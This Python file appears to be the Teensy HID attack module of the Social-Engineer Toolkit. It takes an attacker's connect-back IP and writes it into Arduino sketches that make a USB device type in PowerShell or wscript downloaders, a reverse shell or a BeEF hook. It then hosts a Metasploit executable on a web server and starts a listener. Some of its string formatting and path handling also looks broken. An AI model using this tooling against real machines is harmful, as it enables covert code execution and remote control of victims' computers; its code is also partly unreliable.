#!/usr/bin/env python
# coding=utf-8
############################
#
# Teensy HID Attack Vector
#
############################
import datetime
import os
import re
import subprocess

import src.core.setcore as core

# Py2/3 compatibility
# Python3 renamed raw_input to input
try:
    input = raw_input
except NameError:
    pass


# pull metasploit path
msf_path = core.meta_path()

# check operating system
operating_system = core.check_os()
now = datetime.datetime.today()
if operating_system != "windows":
    import pexpect

# check to see if userconfigpath is created
if not os.path.isdir(os.path.join(core.userconfigpath, "reports")):
    os.makedirs(os.path.join(core.userconfigpath, "reports"))

definepath = os.getcwd()
# define if use apache or not
apache = False
# open set_config here
with open("/etc/setoolkit/set.config") as fileopen:
    apache_check = fileopen.readlines()
# loop this guy to search for the APACHE_SERVER config variable
for line in apache_check:
    # strip \r\n
    line = line.rstrip()
    # if apache is turned on get things ready
    match = re.search("APACHE_SERVER=ON", line)
    # if its on lets get apache ready
    if match:
        for line2 in apache_check:
            # set the apache path here
            match2 = re.search("APACHE_DIRECTORY=", line2)
            if match2:
                line2 = line2.rstrip()
                apache_path = line2.replace("APACHE_DIRECTORY=", "")
                apache = True

# grab info from config file

with open(os.path.join(core.userconfigpath, "teensy")) as fileopen:
    counter = 0
    payload_counter = 0
    choice = None
    for line in fileopen:
        line = line.rstrip()
        if counter == 0:
            choice = str(line)
        if counter == 1:
            payload_counter = 1
        counter += 1

    if choice != "14":
        # Open the IPADDR file
        if core.check_options("IPADDR=") != 0:
            ipaddr = core.check_options("IPADDR=")
        else:
            ipaddr = input(core.setprompt(["6"], "IP address to connect back on"))
            core.update_options("IPADDR=" + ipaddr)

    if not os.path.isfile(os.path.join(core.userconfigpath, "teensy")):
        core.print_error("FATAL:Something went wrong, the Teensy config file was not created.")
        core.exit_set()


def writefile(filename, now):
    with open(os.path.join("src/teensy/" + filename)) as fileopen, \
            open(os.path.join(core.userconfigpath, "reports/teensy_{0}.ino".format(now)), "w") as filewrite:

        for line in fileopen:
            match = re.search("IPADDR", line)
            if match:
                line = line.replace("IPADDR", ipaddr)
            match = re.search("12,12,12,12", line)
            if match:
                ipaddr_replace = ipaddr.replace(".", ",", 4)
                line = line.replace("12,12,12,12", ipaddr_replace)

            filewrite.write(line)


# powershell downloader
if choice == "1":
    writefile("powershell_down.ino", now)

# wscript downloader
if choice == "2":
    writefile("wscript.ino", now)

# powershell reverse
if choice == "3":
    writefile("powershell_reverse.ino", now)

# beef injector
if choice == "4":
    writefile("beef.ino", now)

# java applet downloader
if choice == "5":
    writefile("java_applet.ino", now)

# gnome wget downloader
if choice == "6":
    writefile("gnome_wget.ino", now)

if choice == "13":
    writefile("peensy.ino", now)
    payload_counter = 0

# save our stuff here
print(core.bcolors.BLUE +
      "\n[*] INO file created. You can get it under '{0}'".format(os.path.join(core.userconfigpath,
                                                                               "reports" +
                                                                               "teensy_{0}.ino".format(now))) +
      core.bcolors.ENDC)
print(core.bcolors.GREEN +
      '[*] Be sure to select "Tools", "Board", and "Teensy 2.0 (USB/KEYBOARD)" in Arduino' +
      core.bcolors.ENDC)
print(core.bcolors.RED +
      "\n[*] If your running into issues with VMWare Fusion and the start menu, uncheck\nthe 'Enable Key Mapping' under preferences in VMWare" +
      core.bcolors.ENDC)

pause = input("Press {return} to continue.")

if payload_counter == 1:
    webclone_path = os.path.join(core.userconfigpath, "web_clone")
    metasploit_exec_path = os.path.join(core.userconfigpath, "msf.exe")
    if not apache:

        subprocess.Popen("mkdir {0};"
                         "cp {1} {2} 1> /dev/null 2> /dev/null".format(webclone_path +
                                                                     metasploit_exec_path +
                                                                     os.path.join(webclone_path + "x.exe")),
                         shell=True).wait()

        if operating_system != "windows":
            child = pexpect.spawn("python src/html/web_server.py")

    else:
        subprocess.Popen("cp {0} {1}".format(metasploit_exec_path, os.path.join(webclone_path + "x.exe")), shell=True).wait()

    if os.path.isfile(os.path.join(core.userconfigpath, "meta_config")):
        print(core.bcolors.BLUE + "\n[*] Launching MSF Listener...")
        print(core.bcolors.BLUE + "[*] This may take a few to load MSF..." + core.bcolors.ENDC)
        try:
            if operating_system != "windows":
                child1 = pexpect.spawn("{0} -r {1}\r\n\r\n".format(os.path.join(msf_path + "msfconsole"),
                                                                   os.path.join(core.userconfigpath, "meta_config")))
                child1.interact()
        except:
            if operating_system != "windows":
                if not apache:
                    child.close()
                child1.close()
